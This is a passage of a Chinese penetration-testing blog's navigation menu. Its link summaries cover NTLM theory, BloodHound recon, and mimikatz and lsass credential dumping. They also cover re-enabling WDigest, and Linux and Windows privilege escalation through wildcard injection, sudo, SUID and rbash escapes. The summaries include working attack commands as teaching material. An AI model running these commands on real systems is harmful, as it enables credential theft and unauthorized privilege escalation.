值得一提的是：NTLM是底层的认证协议，必须嵌入上层应用协议中，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP等
一、SSPI与SSP的概念 1.SSPI SSPI（Security Service Provider Interface，安全服务提供接口）是windows定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于：
身份验证机制 为其他协议提供的session security（会话安全）机制，会话安全可为通信提供数据的完整性校验以及数据的加密、解密功能 注意：SSPI只是定义了一套接口函数，并没有实现具体内容
2.SSP SSP（Security Service Provider，安全服务提供者）是SSPI的实现者，微软自己实现了很多SSP，用于提供安全功能，例如：
NTLM SSP：Windows NT 3.51中引入（msv1_0.dll），为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供 NTLM 质询/响应身份验证 Kerberos SSP：Windows 2000中引入，Windows vista中更新为支持AES（kerberos.dll），Windows 2000及更高版本中首选的客户端-服务器域相互身份验证 Digest SSP：Windows XP中引入（wdigest.dll），在 Windows 与 kerberos 不可用的非Windows系统间提供基于 HTTP 和 SASL 身份验证的质询/响应 Negotiate SSP:Windows 2000 中引入（secur32.dll) ，默认选择 Kerberos，如果不可用则选择 NTLM 协议。Negotiate SSP 提供单点登录能力，有时称为集成 Windows 身份验证（尤其是用于 IIS 时)。在 Windows 7 及更高版本中，NEGOExts 引入了协商使用客户端和服务器上 支持的已安装定制 SSP 进行身份验证 Cred SSP:Windows Vista 中引入，Windows XP SP3 上也可用 （credssp.dll)，为远程桌面连接提供单点登录（SSO)和网络级身份验证 Schannel SSP:Windows 2000 中引入（Schannel.dll)，Windows Vista 中 更新为支持更强的 AES 加密和 ECC[6] 该提供者使用 SSL/TLS 记录来加密数据有效载荷 PKU2U SSP:Windows 7 中引入（pku2u.dll) ， 在不隶属域的系统之间提供使用数字证书的对等身份验证 因为SSPI中定义了与session security有关的API，所以上层应用利用任何SSP与远程的服务进行身份验证后，此SSP都会为本次连接生成一个随机key，这个key被称为session key。上层应用经过身份验证后，可以选择性的使用这个key对之后发往服务端或接收自身服务端的数据进行签名或加密
">Windows协议之NTLM</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>内网信息搜集</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-bloodhound%E5%88%86%E6%9E%90%E5%9F%9F%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="内网信息收集-BloodHound分析域环境 bloodhound是一款单页JavaScript Web应用程序，是一款强大的域内环境分析工具，能通过图与线的形式将域内相关用户、组、计算机、会话、ACL等对象之间的关系以可视化方式呈现，我们可以利用它来识别高度复杂的攻击路径
bloodhound的安装 这里我在windows上进行安装
安装neo4j数据库 这里我在windows上安装Neo4j Deployment Center - Graph Database &amp;amp;amp; Analytics：
下载好，解压，直接执行命令启动：
neo4j.bat console 只要jdk版本正确，就能够正常启动
然后浏览器访问并登录：
Host : http://localhost:7474 Username : neo4j Password : neo4j 修改默认密码：
neo4j就安装完毕了
运行bloodhound 下载bloodhound，解压后直接启动exe，并用noe4j的账号密码登录：
进入后页面左上角有三个选项卡：
database info（数据库信息） node info（节点信息） analysis（分析） 右上角有很多设置选项，这里不细说
活动目录信息收集 收集工具使用sharphound（这里用1.x的版本）
有两种收集方案：
powershell采集脚本：SharpHound.ps1 可执行文件：SharpHound.exe 命令如下
SharpHound.exe -c all powershell -exec bypass -command &amp;amp;#34;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&amp;amp;#34; 两种方法都需要将文件上传至目标主机，我这里使用exe进行收集：
会在当前目录生成格式为“时间戳_BloodHound.zip”的文件
导入数据 直接压缩包拖动导入即可：
上传后左上角的database info处就有数据了，此时进入analysis模块，选择不同的查询条件，可以进行不同的分析查询，比如“find all domain admins”：
">内网信息收集-BloodHound分析域环境</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E7%A1%80%E6%94%B6%E9%9B%86/" class="article-link" data-summary="内网信息收集-基础收集 主要有：
本机基础信息收集 域内信息收集 基于powershell的收集 本机基础信息收集 在getshell后，首先就是以当前主机为中心进行信息收集
查看当前用户权限 whoami /all 可以查看当前用户所处的用户组、拥有的特权等，用于综合判断是否需要提权
查看网络配置信息 ipconfig /all 查看当前主机网络配置情况，包括主机的IP地址、主机名、各网络适配器的信息等，可以判断主机所在网段
值得一提的是Ethernet0中的DNS服务器地址，搭建过域环境便知道，DNS服务器的IP地址通常就为域控制器的地址
查看主机路由信息 查看主机路由表：
route print 路由表中的“网络目标”都是主机可以访问到的，后续可以对其中的网段进行探测
查看操作系统信息 systeminfo 查看操作系统信息，包括主机名、操作系统版本、系统目录、所处的域或工作组、网卡信息、安装的补丁
查看端口连接信息 netstat -ano 查看主机的TCP、UDP端口的监听和开放情况，内网其他主机访问本机时也会建立连接，所以也能用来收集内网地址段
查看当前会话列表 查看当前主机与所连接的客户机之间的会话
net session 查看当前网络共享信息 查看主机开启的共享列表：
net share 查看已连接的网络共享 查看主机与其他主机远程建立的网络共享连接
net use 查看当前进程信息 查看当前主机所有进程信息
tasklist 可以针对进程信息进行杀软识别
也可以用WMIC:
wmic process get name, ProcessID, ExecutablePath 查看当前服务信息 查看当前所有服务信息，过滤出服务名称、路径、创建时间、运行状态信息
wmic service get Caption,Name,PathName,StartName,State 查看计划任务信息 查看主机上所有的计划任务：
">内网信息收集-基础收集</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86/" class="article-link" data-summary="内网信息收集-用户凭据收集 这是内网渗透中很重要的一步，很多操作都需要用户凭据
注：这里的收集大多需要管理员权限，所以需要配合权限提升
获取域内单机密码和哈希 在前面介绍NTLM协议时介绍过windows的NTLM本地认证流程，Windows协议之NTLM：
在用户输入密码进行身份验证的过程中，所有操作都是在本地进行的。系统将用户输入的密码转换为NTLM Hash，再将其与SAM中的NTLM Hash文件进行比较，若相同则说明密码正确，反之则为错误。当用户注销、重启、锁屏后，操作系统会让winlog.exe显示登陆界面，即密码输入框，在winlog.exe程序接收到输入之后，会将密码交给lsass.exe进程，lsass.exe进程中会存储一份明文密码，并将其加密成NTLM Hash，与SAM数据库进行比较和认证
在上述过程中，有个lsass.exe进程，我们在渗透过程中使用的Mimikatz就是从该进程中抓取的明文或Hash密码
这里详细记录在如何使用mimikatz进行信息收集：
在线读取lsass进程 将mimikatz上传至目标主机后，命令行启动：
mimikatz.exe &amp;amp;#34;privilege::debug&amp;amp;#34; &amp;amp;#34;sekurlsa::logonpasswords full&amp;amp;#34; exit # &amp;amp;#34;privilege::debug&amp;amp;#34;用于提升至DebugPrivilege权限(需要管理员权限) # &amp;amp;#34;sekurlsa::logonpasswords full&amp;amp;#34;用于导出用户凭据 比如这里抓取到NTLM hash，尝试解密：
即可获得明文密码
离线读取lsass内存文件 也可以将lsass的进程内存转储，导出到本地后使用mimikatz离线读取
这里选择微软官方的ProcDump进行内存转储，首先将procdump上传至目标主机，命令行启动：
procdump.exe -accepteula -ma lsass.exe lsass.dmp 接下来将lsass.dmp放到本地离线读取：
mimikatz.exe &amp;amp;#34;sekurlsa::minidump lsass.dmp&amp;amp;#34; &amp;amp;#34;sekurlsa::logonpasswords full&amp;amp;#34; exit # &amp;amp;#34;sekurlsa::minidump lsass.dmp&amp;amp;#34;用于加载内存文件 # &amp;amp;#34;sekurlsa::logonpasswords full&amp;amp;#34;用于导出用户凭据 在上面的抓取过程中可以看见，wdigest功能中抓取不到明文密码，因为微软在2014年5月发布了补丁，关闭了wdigest功能，禁止从内存中获取明文密码，且windows server 2012及以上版本默认关闭了wdigest功能
可以通过修改注册表，可以重新开启wdigest功能：
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # 开启wdigest 在开启wdigest后，若主机再次触发本地认证操作（比如睡眠后重新登录），则可抓取明文密码：
在线读取SAM文件 读取SAM文件中保存的用户登录凭据，可以导出当前系统中所有本地用户的hash：
mimikatz.exe &amp;amp;#34;privilege::debug&amp;amp;#34; &amp;amp;#34;token::elevate&amp;amp;#34; &amp;amp;#34;lsadump::sam&amp;amp;#34; exit # &amp;amp;#34;privilege::debug&amp;amp;#34;用于提升至DebugPrivilege权限 # &amp;amp;#34;token::elevate&amp;amp;#34;用于提升至SYSTEM权限 # &amp;amp;#34;lsadump::sam&amp;amp;#34;用于读取本地SAM文件 离线读取本地SAM文件 将SAM文件导出并使用mimikatz加载并读取其中的用户登录凭据等信息，但微软为了提高SAM文件安全性，会对SAM文件使用密钥加密，该密钥存储于于SAM同目录下的SYSTEM文件中
">内网信息收集-用户凭据收集</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>权限提升</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-peas%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="权限提升-PEAS使用 一个牛逼的针对权限提升的工具，适用于Windows/linux/unix*/macOS提权
这些工具搜索可能的本地权限提升路径，您可以利用这些路径并将它们以漂亮的颜色打印给您，以便您可以轻松识别错误配置
这里对其进行简单介绍，详细使用请前往github地址：https://github.com/carlospolop/PEASS-ng/
WinPEAS 介绍 直接命令行执行即可：
winPEASany.exe 运行winpeas能搜索所有可能的提权路径，检查的信息如下
系统信息 基本系统信息 使用 Watson 搜索漏洞 枚举 Microsoft 更新信息 PS、审计、WEF 和 LAPS 设置 LSA 保护 凭据保护 WDigest 缓存的信用数量 环境变量 互联网设置 当前驱动器信息 杀毒软件 Windows Defender UAC 配置 NTLM 设置 本地组策略 Applocker 配置和绕过建议 打印机 命名管道 AMSI 供应商 系统监视器 .NET 版本 用户信息 用户信息 当前令牌特权 剪贴板文本 当前登录的用户 RDP 会话 曾经登录过的用户 自动登录凭据 主文件夹 密码策略 本地用户详细信息 登录会话 进程信息 有趣的进程（非微软） 服务信息 有趣的服务（非 Microsoft）信息 可修改的服务 可写服务注册表binpath PATH DLL劫持 应用信息 当前活动窗口 安装的软件 自动运行 计划任务 设备驱动程序 网络信息 当前net share 映射驱动器 (WMI) 主机文件 网络接口 监听端口 防火墙规则 DNS 缓存（限制 70） 互联网设置 Windows 凭据 Windows 保险库 凭证管理器 保存的 RDP 设置 最近运行的命令 默认 PS 成绩单文件 DPAPI 万能密钥 DPAPI 凭据文件 远程桌面连接管理器凭据 Kerberos 门票 无线上网 AppCmd.exe SSClient.exe SCCM 安全包凭证 AlwaysInstallElevated WSUS 浏览器信息 Firefox 数据库 Firefox 历史上的凭据 Chrome 数据库 chrome 历史上的凭据 当前的 IE 选项卡 IE历史上的凭据 IE 收藏夹 提取已保存的密码：Firefox、Chrome、Opera、Brave 有趣的文件和注册表 Putty会话 Putty SSH 主机密钥 SuperPutty信息 OneDrive 同步的 Office365 端点 注册表中的 SSH 密钥 云凭证 检查无人参与的文件 检查 SAM 和 SYSTEM 备份 检查缓存的 GPP 密码 从 McAffe SiteList.xml 文件中检查并提取凭据 可能的具有凭据的注册表 用户家中可能的凭据文件 回收站中可能存在的密码文件 可能包含凭据的文件（这需要几分钟） 用户文件（限制 100 个） Oracle SQL Developer 配置文件检查 Slack文件搜索 Outlook 下载 机器和用户证书文件 Office最近的文件 隐藏的文件和文件夹 具有写入权限的非默认文件夹中的可执行文件 WSL 检查 活动信息 登录 &#43; 显式登录事件 流程创建事件 PowerShell 事件 电源开/关事件 附加（较慢）检查 LOLBAS 搜索 在默认 WSL 分发中运行**linpeas.sh** 参数设置 -h可以查看所有参数：
">权限提升-PEAS使用</a>
        
      </div>
    </li>
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>linux提权</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" class="article-link" data-summary="Linux内核提权 顾名思义，即利用Linux内核漏洞进行提权，一般包含三个环节：
对目标系统进行信息收集，获取到系统内核信息以及版本信息 根据内核版本获取其对应的漏洞以及EXP 使用找到的EXP对目标系统发起攻击，完成提权操作 内核溢出 漏洞的原理更偏向于pwn，指在操作系统内核空间发生的缓冲区溢出漏洞。即程序没有正确验证输入数据的大小时，多出的数据会覆盖相邻的内存，导致安全问题
信息收集 首先需要对Linux发行版本、内核版本进行信息收集，这里以我的CentOS 7为例，展示以下常用命令的输出内容：
uname -a	# 查看系统全部信息 cat /etc/issue	# 查看Linux 系统的版本信息 不知道什么原因，这里文件中的占位符没有被解析，这些占位符的意思：
\S：这表示系统的名称。在许多 Linux 发行版中，这通常会被替换为具体的发行版名称（例如 &amp;amp;ldquo;Kali Linux&amp;amp;rdquo;）。
\r：这一部分通常表示系统的版本号，这是内核的版本信息。
\m：这表示机器的硬件架构。例如，它可能会返回 x86_64 表示 64 位系统，或 i686 表示 32 位系统。
cat /etc/*-release	# 查看Linux 系统的详细版本信息 lsb_release -a	# 获取系统的详细信息，但系统不一定有lsb_release cat /proc/version	# 查看 Linux 内核的版本信息及相关的编译信息 查找exp 使用kali自带的searchsploit即可查找exp，例如查找Ubantu 15.04的漏洞：
searchsploit Ubantu 15.04 查到后，比如exp的path为linux/local/37088.c：
查看exp：
searchsploit -x linux/local/37088.c 有几点需要注意阅读：
源码注释：了解源码编译方式 源码内容：了解工作流程便于优化与修改，且避免存在恶意后门 复制exp到当前目录：
searchsploit -m linux/local/37088.c 使用exp 通常使用wget等办法将exp传到受害主机上，并按照exp使用方法进行提权（借助搜素引擎查阅使用方法），通常来说：
">Linux内核提权</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/" class="article-link" data-summary="Linux提权-通配符提权 通配符可以帮助用户提升工作效率，本身没有安全问题，但当其与潜在危险的命令结合时，就可能导致系统安全问题
chown&#43;通配符劫持提权 chown是linux中用于更改文件或目录所有权的命令
当管理员通过chown加通配符的方式执行命令，渗透测试人员可以使用chown的--reference参数达到文件所有者劫持的效果
--ference参数的用法如下：
--reference=&amp;amp;lt;参考目录或文件&amp;amp;gt; # 更改目标文件的所有者为参考文件的所有者 接下来搭建一个场景
环境配置 以root权限进行配置
在/tmp/pass目录下创建root.pass且权限为仅root可读：
echo &amp;amp;#34;Admin123456&amp;amp;#34; &amp;amp;gt; root.pass chmod 400 root.pass 创建一个定时任务，原本目的为每分钟将/tmp/pass目录下的.pass文件所有者更改为root：
* * * * * root cd /tmp/pass&amp;amp;amp;&amp;amp;amp;/bin/chown -R root:root *.pass (由于是使用root权限设置的crontab，所以这里可以不注明root)
环境配置完毕，切换用户到yuy0ung，开始利用
漏洞利用 信息收集发现存在一个以root权限使用chown更改文件所有者的定时任务，且不规范的使用了通配符*
根据内容发现/tmp/pass/目录下有个root.pass的密码文件，但没有权限读取：
这里可以尝试利用上面定时任务中不规范的命令
新建两个名为a.pass、&amp;amp;ndash;reference=a.pass的文件：
echo &amp;amp;gt; a.pass&amp;amp;amp;&amp;amp;amp;echo &amp;amp;gt;--reference=a.pass 此时，若定时任务以root权限执行cd /tmp/pass&amp;amp;amp;&amp;amp;amp;/bin/chown -R root:root *.pass，由于*的存在，我们新建的文件也会被带入命令，而--reference=a.pass文件会被当作是chown命令的参数处理，那么实际上的命令就会变成：将当前目录所有.pass文件所属组改为a.pass文件的所属组
等待定时任务执行发现root.pass的所有者变成了yuy0ung：
接下来即可直接读取root.pass文件：
tar&#43;通配符注入提权 tar是linux中常用的文件归档工具
在实际生产环境中，我们可能会通过定时任务使用tar去备份网站文件、日志文件
当定时任务中调用了tar且使用了通配符，可能导致权限提升
通配符注入主要在于--checkpoint-action和--checkpoint这两个参数的利用
参数 功能 &amp;amp;ndash;checkpoint-action=ACTION 每隔[NUMBER]个记录显示进度信息（默认为10个） &amp;amp;ndash;checkpoint[=NUMBER] 在每个检查点上执行ACTION 场景复现 这个场景在云尘靶场的linux提权系列-3中考察了，这里直接给出我的wp作为参考：云尘靶场-Linux提权系列WP
rsync&#43;通配符注入提权 rsync是一个用于在两台计算机之间同步文件的命令行工具
">Linux提权-通配符提权</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/rbash%E9%80%83%E9%80%B8/" class="article-link" data-summary="rbash逃逸 何为rbash rbash(The restricted mode of bash),也就是限制型bash；是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）
rhash可能会设置一些限制：
不能使用cd命令（即不能更改目录） 不能设置或取消环境变量：SHELL， PATH， ENV， BASH_ENV 导入功能受限 命令中文件名中不能包含 &amp;amp;lsquo;/ &amp;amp;rsquo; 或&amp;amp;rsquo;-&amp;amp;rsquo; 不能使用使用 &amp;amp;gt;，&amp;amp;gt;|， &amp;amp;lt;&amp;amp;gt;， &amp;amp;gt;&amp;amp;amp;， &amp;amp;amp;&amp;amp;gt;， &amp;amp;raquo; 等重定向操作符 不能使用 unset 命令来取消环境变量或 shell 函数 只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等 &amp;amp;hellip;&amp;amp;hellip; rbash提高了安全性，但对我们getshell后的相关操作造成了很多限制（比如反弹shell）
启用rbash 首先创建用户：
sudo adduser tw 创建rbash软连接:
cd /bin ln -s bash rbash 然后启用rbash：
sudo usermod -s /bin/rbash tw rbash逃逸 本质是使用某种方法获取一个新的shell，下面提到的方法都有前提条件，比如命令/工具/语言要存在，或某个特殊符号未受限制（如/）
1.利用常见应用/文件 使用Linux现有的软件，执行命令获取一个shell
vi编辑器 打开vi，在末行模式执行命令：
:set shell=/bin/bash shell 即可实现逃逸
">rbash逃逸</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/sudo%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/" class="article-link" data-summary="sudo相关提权思路 sudo（super user do）是linux系统中用于管理用户权限的工具，允许普通用户在无需切换到超级用户的情况下以root身份执行命令，通常，在使用sudo命令时，用户需要输入自己的密码验证自己是否有权限使用，如果没有权限，会告知用户：该用户不在sudoers文件中，这个事件将会被报告
如果sudo配置不当，可能导致安全隐患
一、sudo权限分配不当 当配置普通用户sudo权限时，设置了免密的sudo用户，即该用户不需要输入口令即可执行特权命令
我们通常使用如下命令查看当前sudo权限：
sudo -l 而有一部分命令如果能免密执行，则可以进行权限提升的利用，这也是我们常说的sudo提权
sudo的基本利用思路有如下几种：
免密使用sudo权限执行某些命令，重新获取一个root身份的shell 某些工具允许免密sudo运行，且能够运行脚本/配置文件，可以修改脚本/配置文件实现获取一个root身份的shell 免密使用sudo权限执行某些命令，获取/etc/shadow第一行root的密码哈希，再进行爆破获取明文密码 免密使用sudo权限执行某些命令，用新的root密码哈希覆盖掉原本的/etc/shadow （思路选择的推荐度按序降低，越靠后的思路，对主机造成的影响越大）
由于能利用的场景太多，这里不作赘述，利用命令均可在这个网站上查询：GTFOBins
可以参考文章学习：Linux提权之Sudo 70种提权方法
二、sudo脚本篡改提权 另一种情况，管理员可能会将某个shell脚本设置为sudo免密执行，如果低权限用户对该文件可写，那么我们可以将提权代码写入该文件，实现权限提升。我们配置如下场景（实验环境为centos 7）：
首先以root身份配置：
groupadd yuy0ung # 创建一个名为 yuy0ung 的新组 useradd -d /home/yuy0ung -m yuy0ung -g yuy0ung -s /bin/bash -p 123456 # 添加用户 yuy0ung，指定主目录为 /home/yuy0ung，若不存在则创建；设置默认 shell 为 /bin/bash；设置组为 yuy0ung；设定密码为 123456 mkdir -p ~yuy0ung/demo # 创建目录 /home/yuy0ung/demo，若上级目录不存在，则一并创建 chown yuy0ung:yuy0ung ~yuy0ung/demo # 将目录 /home/yuy0ung/demo 的所有者和所属组更改为 yuy0ung chmod a&#43;x ~yuy0ung/demo # 为所有用户增加 /home/yuy0ung/demo 目录的执行权限 echo &amp;amp;#34;yuy0ung ALL=(root) NOPASSWD:/home/yuy0ung/demo/shell.sh&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /etc/sudoers # 允许 yuy0ung 用户在不输入密码的情况下以 root 身份执行 /home/yuy0ung/demo/shell.sh 脚本，将此配置追加到 /etc/sudoers 文件中 然后切换到yuy0ung：
">sudo相关提权思路</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/suid%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/" class="article-link" data-summary="suid相关提权思路 SetUID是linux的一种安全机制，允许用户在执行特定文件时暂时将其有效用户ID改为该文件所有者的用户ID。这样，即使当前用户没有执行该文件的权限，也可以执行该文件。
使用如下命令为目标文件添加suid权限：
chmod u&#43;s /etc/passwd 注意：
只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义 命令执行者要对该程序文件拥有执行(x)权限才能使用 SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效 suid配置不当提权 如果suid配置不当，可能会导致权限提升，原理也是利用被赋予suid权限的文件命令执行，获取一个新的高权限的shell
我们以find命令为例配置一个实验场景（chmod u&#43;s /usr/bin/find即可）：
我们现在的shell是普通用户yuy0ung的身份，尝试利用suid来提权：
首先查找所有配置了suid权限的文件：
find / -perm -4000 -type f -exec ls -la {} 2&amp;amp;gt;/dev/null \; 这里选项参数是这样设置的：
-type f: 只查找普通文件，排除目录等其他类型的文件
-exec ls -la {} 2&amp;amp;gt;/dev/null ;: 对查找到的文件执行 ls -la 命令，2&amp;amp;gt;/dev/null 表示将标准错误输出重定向到 /dev/null，以避免显示不必要的错误信息
-perm匹配权限：
4000 2000 1000分别表示SUID SGID SBIT 1.普通文件，文件的权限一般三位，777最高文件权限 -perm -0777搜索的就是最高权限的文件rwxrwxrwx -perm &#43;0777搜索的只要包含rwxrwxrwx任意一个的文件 2.特殊文件，包含权限位置四位，7000为最高，即–s–s–t，同样的方法 -perm -7000搜索的就是最高权限的文件–s–s–t -perm &#43;7000搜索的只要包含–s–s–t任意一个的文件，–s — —（4000）、— –s —（2000）、— — –t（1000）等 根据查找结果可以看到/usr/bin/find被赋予了suid权限，而他的所有者为root，我们可以这样获取一个root权限的shell：
find /etc/passwd -exec /bin/bash -p \; ">suid相关提权思路</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>windows提权</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-link" data-summary="权限提升-windows下的信息收集 进入内网后，可以通过信息收集扩展攻击面，找到更多可能导致权限提升的入口点
服务器信息枚举 版本信息 查看系统版本号：
ver 架构信息 获取到服务器架构信息，有助于后续选择对应的漏洞利用程序或编写exp和payload
wmic os get osarchitecture 或
echo %PROCESSOR_ARCHITECTURE% 服务信息 获取服务信息可以得知系统服务的进程ID、启动方式和状态，效果类似于运行services.msc
sc query state=all 或
wmic service list brief powershell命令获取服务及服务对应的执行文件路径和参数：
Get-wmiObject win32_service | select Name,PathName 进程信息 获取系统进程:
tasklist 获取进程信息:
tasklist /svc 使用wmic命令获取系统进程信息：
wmic process list brief 也可以使用powershell cmdlet命令：
ps 或
Get-WmiObject -Query &amp;amp;#34;select * from Win32_Process&amp;amp;#34; | where {$_.Name -notlike &amp;amp;#34;svchost*&amp;amp;#34;} | Select-Object Name, Handle, @{Label=&amp;amp;#34;Owner&amp;amp;#34;;Expression={$_.GetOwner().User}} | Format-Table -AutoSize 驱动信息 获取当前系统中安装的服务器驱动程序信息：
driverquery 服务器驱动程序信息有助于我们发现可能存在漏洞的驱动，进而去搜索漏洞利用程序进行提权
磁盘信息 获取计算机的全部磁盘信息：
wmic logicaldisk get caption,description,providername 获取某个磁盘的文件夹树并将结果输出到文件夹中：
tree D:\ &amp;amp;gt;E:\Desktop\tree.txt 获取某个磁盘的文件列表并将结果输出到文本文件中：
dir /s D:\ &amp;amp;gt;E:\Desktop\tree.txt 补丁信息 获取系统补丁情况：
wmic qfe get Caption,Description,HotFixID,InstalledOn 也可以使用Powershell cmdlet命令：
Get-wmiObject -query &amp;amp;#39;select * from win32_quickfixengineering&amp;amp;#39; | foreach {$_.hotfixid} 或
">windows下的信息收集</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C/" class="article-link" data-summary="权限提升-windows密码操作 密码搜索 密码搜索属于信息搜集的一部分，很多用户喜欢将自己的网站、邮箱、应用程序设置同一个密码，可以执行各类命令来搜索系统内存储密码的配置文件，通过组合收集到的密码来尝试登陆高权限账户，可能达到权限提升或横向移动的目的
文件中的密码搜索 搜索文件内容 搜索文件内容里包括“password”字符串的txt文件：
findstr /SI /M &amp;amp;#34;password&amp;amp;#34; *.txt 也可以增加其他文件的格式：
findstr /SI /M &amp;amp;#34;password&amp;amp;#34; *.txt *.ini *.config 参数/SI：在当前目录和所有子目录中搜索指定文件， 指定搜索部分大小写 参数/M：如果搜索到相关的文件，则只列出文件的绝对路径 再使用“type &#43; 目标文件路径”命令来获取文件内容
如果不添加参数/M，则会列出包含目标字符串的所有文件和内容，会显得比较杂乱
搜索文件名 搜索当前目录及子目录中文件名包含字符串“password”的文件：
dir /s *password* powershell命令：
Get-ChildItem &amp;amp;lt;文件夹路径&amp;amp;gt; -Include *password.txt* -recurse cmd命令切换到其他目录并搜索文件名中包含web.config的文件：
cd /d E: &amp;amp;amp;&amp;amp;amp; dir /b /s web.config 用for命令查找某盘符内文件名包含password.txt:
for /r &amp;amp;lt;盘符&amp;amp;gt; %i in (password.txt) do @echo %i 也可以使用where命令来查找这种类型的文件：
where /r C:\ *password.txt 在注册表中寻找密码 获取注册表根键HKCU下包含“password”字符串的全部内容：
reg query HKCU /f password /t REG_SZ /s 为了方便查看，或当前在webshell中操作时，可以将结果保存在文本中，下载后再查看
